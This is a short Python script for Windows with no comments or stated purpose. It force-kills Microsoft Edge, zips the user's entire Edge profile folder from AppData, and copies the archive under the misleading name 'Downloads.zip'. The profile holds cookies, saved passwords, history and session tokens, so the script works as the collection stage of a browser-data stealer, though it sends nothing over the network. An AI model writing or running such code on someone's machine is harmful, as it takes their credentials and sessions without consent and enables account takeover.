import os
import shutil

user =  os.getlogin()
drive = os.getenv("SystemDrive")
drive1 = os.getcwd()
path2 = drive + "//Users/" + user + "/AppData/Local/Microsoft"


os.chdir(path2)

os.system('TASKKILL /F /IM msedge.exe')
root_directory='Edge'
shutil.make_archive("Edge","zip",root_directory)
shutil.copy(src="Edge.zip", dst=drive1+"Downloads.zip")  

